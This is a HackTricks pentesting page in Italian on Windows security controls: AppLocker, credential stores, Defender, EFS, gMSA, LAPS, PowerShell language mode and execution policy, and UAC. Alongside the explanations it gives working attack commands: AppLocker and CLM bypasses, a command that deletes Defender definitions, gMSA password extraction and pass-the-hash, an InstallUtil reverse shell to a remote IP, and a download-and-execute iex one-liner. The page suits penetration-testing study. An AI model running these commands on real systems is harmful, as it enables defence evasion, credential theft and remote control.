# Controlli di sicurezza di Windows

{{#include ../../banners/hacktricks-training.md}}

## Politica AppLocker

Una application whitelist è una lista di applicazioni software o eseguibili approvati che sono autorizzati a essere presenti ed eseguiti su un sistema. Lo scopo è proteggere l'ambiente da malware dannoso e software non approvato che non è in linea con le specifiche esigenze aziendali di un'organizzazione.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) è la **soluzione di application whitelisting** di Microsoft e offre agli amministratori di sistema il controllo su **quali applicazioni e file gli utenti possono eseguire**. Fornisce un **controllo granulare** su eseguibili, script, file di installazione di Windows, DLL, packaged apps e packed app installers.\
È comune per le organizzazioni **bloccare cmd.exe e PowerShell.exe** e l'accesso in scrittura ad alcune directory, **ma tutto questo può essere bypassed**.

### Verifica

Verifica quali file/estensioni sono blacklisted/whitelisted:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Questo percorso del registro contiene le configurazioni e le politiche applicate da AppLocker, fornendo un modo per rivedere l'insieme corrente di regole applicate sul sistema:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Esempi di **cartelle scrivibili** utili per eludere AppLocker Policy: se AppLocker consente l'esecuzione di qualsiasi elemento all'interno di `C:\Windows\System32` o `C:\Windows`, esistono **cartelle scrivibili** che puoi usare per **eludere questo**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- I binari comunemente considerati **trusted** di [**"LOLBAS's"**](https://lolbas-project.github.io/) possono essere utili anche per bypassare AppLocker.
- **Regole scritte male possono essere aggirate**
- Per esempio, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, puoi creare una **cartella chiamata `allowed`** ovunque e sarà consentita.
- Le organizzazioni spesso si concentrano sul **bloccare l'eseguibile `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ma si dimenticano delle **altre** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) come `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` o `PowerShell_ISE.exe`.
- **L'enforcement delle DLL è molto raramente abilitato** a causa del carico aggiuntivo che può imporre su un sistema e della quantità di testing richiesta per assicurarsi che nulla si rompa. Quindi usare **DLLs come backdoor aiuta ad aggirare AppLocker**.
- Puoi utilizzare [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) per **eseguire codice Powershell** in qualsiasi processo e bypassare AppLocker. Per maggiori informazioni controlla: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Credentials Storage

### Security Accounts Manager (SAM)

Le credenziali locali sono presenti in questo file, le password sono memorizzate come hash.

### Local Security Authority (LSA) - LSASS

Le **credenziali** (in forma di hash) vengono **salvate** nella **memoria** di questo sottosistema per motivi di Single Sign-On.\
**LSA** amministra la **security policy** locale (password policy, permessi degli utenti...), **authentication**, **access tokens**...\
LSA sarà quello che **controllerà** le credenziali fornite all'interno del file **SAM** (per un login locale) e **comunicherà** con il **domain controller** per autenticare un utente di dominio.

Le **credenziali** sono **salvate** all'interno del **processo LSASS**: ticket Kerberos, hash NT e LM, password facilmente decriptabili.

### LSA secrets

LSA può salvare su disco alcune credenziali:

- Password dell'account computer dell'Active Directory (domain controller non raggiungibile).
- Password degli account dei servizi di Windows
- Password delle attività pianificate
- Altro (password di applicazioni IIS...)

### NTDS.dit

È il database dell'Active Directory. È presente solo nei Domain Controllers.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) è un antivirus disponibile in Windows 10 e Windows 11, e in versioni di Windows Server. Blocca strumenti comuni di pentesting come **`WinPEAS`**. Tuttavia, ci sono modi per eludere queste protezioni.

### Check

Per verificare lo **stato** di **Defender** puoi eseguire il cmdlet PS **`Get-MpComputerStatus`** (controlla il valore di **`RealTimeProtectionEnabled`** per sapere se è attivo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Per enumerarlo puoi anche eseguire:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS protegge i file tramite crittografia, utilizzando una **chiave simmetrica** nota come **File Encryption Key (FEK)**. Questa chiave viene crittografata con la **chiave pubblica** dell'utente e memorizzata nello $EFS **alternative data stream** del file crittografato. Quando è necessaria la decrittazione, la corrispondente **chiave privata** del certificato digitale dell'utente viene usata per decrittare il FEK dal flusso $EFS. Maggiori dettagli sono disponibili [here](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Scenari di decrittazione senza l'iniziativa dell'utente** includono:

- Quando file o cartelle vengono spostati su un file system non-EFS, come [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), vengono automaticamente decrittati.
- I file crittografati inviati attraverso la rete via protocollo SMB/CIFS vengono decrittati prima della trasmissione.

Questo metodo di crittografia permette **accesso trasparente** ai file crittografati al proprietario. Tuttavia, semplicemente cambiando la password del proprietario e effettuando il login non si potrà decrittare.

Punti chiave:

- EFS usa un FEK simmetrico, crittografato con la chiave pubblica dell'utente.
- La decrittazione impiega la chiave privata dell'utente per accedere al FEK.
- La decrittazione automatica avviene in condizioni specifiche, come la copia su FAT32 o la trasmissione di rete.
- I file crittografati sono accessibili al proprietario senza passaggi aggiuntivi.

### Check EFS info

Verifica se un **utente** ha **usato** questo **servizio** controllando se esiste questo percorso: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Controlla **chi** ha **accesso** al file usando cipher /c \<file>\
Puoi anche usare `cipher /e` e `cipher /d` all'interno di una cartella per **encrypt** e **decrypt** tutti i file

### Decrypting EFS files

#### Ottenere privilegi SYSTEM

Questo metodo richiede che l'**utente vittima** stia **eseguendo** un **processo** sull'host. Se è così, usando una sessione `meterpreter` puoi impersonare il token del processo dell'utente (`impersonate_token` da `incognito`). Oppure puoi semplicemente `migrate` al processo dell'utente.

#### Conoscere la password dell'utente


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft ha sviluppato le **Group Managed Service Accounts (gMSA)** per semplificare la gestione degli account di servizio nelle infrastrutture IT. A differenza degli account di servizio tradizionali che spesso hanno l'impostazione "**Password never expire**" abilitata, le gMSA offrono una soluzione più sicura e gestibile:

- **Gestione automatica delle password**: le gMSA utilizzano una password complessa di 240 caratteri che cambia automaticamente in base alla policy di dominio o computer. Questo processo è gestito dal Key Distribution Service (KDC) di Microsoft, eliminando la necessità di aggiornamenti manuali delle password.
- **Sicurezza migliorata**: questi account sono immuni dai lockout e non possono essere usati per login interattivi, aumentando la loro sicurezza.
- **Supporto per più host**: le gMSA possono essere condivise su più host, rendendole ideali per servizi che girano su più server.
- **Capacità per Scheduled Task**: a differenza dei managed service accounts, le gMSA supportano l'esecuzione di scheduled task.
- **Semplificazione della gestione SPN**: il sistema aggiorna automaticamente il Service Principal Name (SPN) quando ci sono cambiamenti nei dettagli sAMaccount del computer o nel nome DNS, semplificando la gestione degli SPN.

Le password per le gMSA sono memorizzate nell'attributo LDAP _**msDS-ManagedPassword**_ e vengono resettate automaticamente ogni 30 giorni dai Domain Controllers (DC). Questa password, un blob di dati crittografati noto come [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), può essere recuperata solo dagli amministratori autorizzati e dai server su cui le gMSA sono installate, garantendo un ambiente sicuro. Per accedere a queste informazioni è necessaria una connessione protetta come LDAPS, oppure la connessione deve essere autenticata con 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Puoi leggere questa password con [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Maggiori informazioni in questo post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Inoltre, consulta questa [pagina web](https://cube0x0.github.io/Relaying-for-gMSA/) su come eseguire una **NTLM relay attack** per **read** la **password** di **gMSA**.

### Abusing ACL chaining per leggere la password gestita di gMSA (GenericAll -> ReadGMSAPassword)

In molti ambienti, utenti con pochi privilegi possono pivot verso i segreti gMSA senza compromettere il DC abusando di ACL di oggetti mal configurate:

- Un gruppo che puoi controllare (p.es., tramite GenericAll/GenericWrite) ha il permesso `ReadGMSAPassword` su una gMSA.
- Aggiungendoti a quel gruppo, erediti il diritto di leggere il blob `msDS-ManagedPassword` della gMSA via LDAP e ricavare credenziali NTLM utilizzabili.

Workflow tipico:

1) Individua il percorso con BloodHound e marca i tuoi foothold principals come Owned. Cerca edges come:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Aggiungiti al gruppo intermedio che controlli (esempio con bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Leggere la password gestita del gMSA tramite LDAP e derivare l'hash NTLM. NetExec automatizza l'estrazione di `msDS-ManagedPassword` e la conversione in NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Autenticarsi come il gMSA utilizzando l'hash NTLM (non serve il plaintext). Se l'account è in Remote Management Users, WinRM funzionerà direttamente:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Note:
- Le letture LDAP di `msDS-ManagedPassword` richiedono sealing (es., LDAPS/sign+seal). Gli strumenti lo gestiscono automaticamente.
- gMSAs ricevono spesso diritti locali come WinRM; verifica l'appartenenza ai gruppi (es., Remote Management Users) per pianificare il movimento laterale.
- Se hai bisogno solo del blob per calcolare l'NTLM da solo, vedi la struttura MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

La **Local Administrator Password Solution (LAPS)**, disponibile per il download da [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), consente la gestione delle password dell'amministratore locale. Queste password, che sono **randomizzate**, uniche e **regolarmente cambiate**, sono memorizzate centralmente in Active Directory. L'accesso a queste password è ristretto tramite ACL agli utenti autorizzati. Se vengono concesse autorizzazioni sufficienti, è possibile leggere le password degli amministratori locali.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **limita molte delle funzionalità** necessarie per usare PowerShell in modo efficace, come il blocco degli oggetti COM, il consentire solo tipi .NET approvati, i workflow basati su XAML, le classi PowerShell e altro.

### **Verifica**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Nelle versioni attuali di Windows quel Bypass non funzionerà ma puoi usare [ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Per compilarlo potresti aver bisogno** **di** _**Aggiungere un riferimento**_ -> _Sfoglia_ -> _Sfoglia_ -> aggiungi `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` e **cambia il progetto a .Net4.5**.

#### Bypass diretto:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Puoi usare [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) per **eseguire codice Powershell** in qualsiasi processo e bypassare la modalità constrained. Per maggiori informazioni consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Policy di esecuzione PS

Per impostazione predefinita è impostata su **restricted.** Principali modi per bypassare questa policy:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Maggiori informazioni possono essere trovate [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

È l'API che può essere usata per autenticare gli utenti.

Lo SSPI si occuperà di trovare il protocollo adeguato per due macchine che vogliono comunicare. Il metodo preferito per questo è Kerberos. Successivamente lo SSPI negozierà quale protocollo di autenticazione verrà usato; questi protocolli di autenticazione sono chiamati Security Support Provider (SSP), si trovano all'interno di ogni macchina Windows sotto forma di DLL e entrambe le macchine devono supportare lo stesso per poter comunicare.

### Principali SSP

- **Kerberos**: Il preferito
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** and **NTLMv2**: Per motivi di compatibilità
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web server e LDAP, password in forma di hash MD5
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL e TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Utilizzato per negoziare il protocollo da usare (Kerberos o NTLM, con Kerberos come predefinito)
- %windir%\Windows\System32\lsasrv.dll

#### La negoziazione potrebbe offrire diversi metodi o solo uno.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) è una funzionalità che abilita un **prompt di consenso per attività con privilegi elevati**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## Riferimenti

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
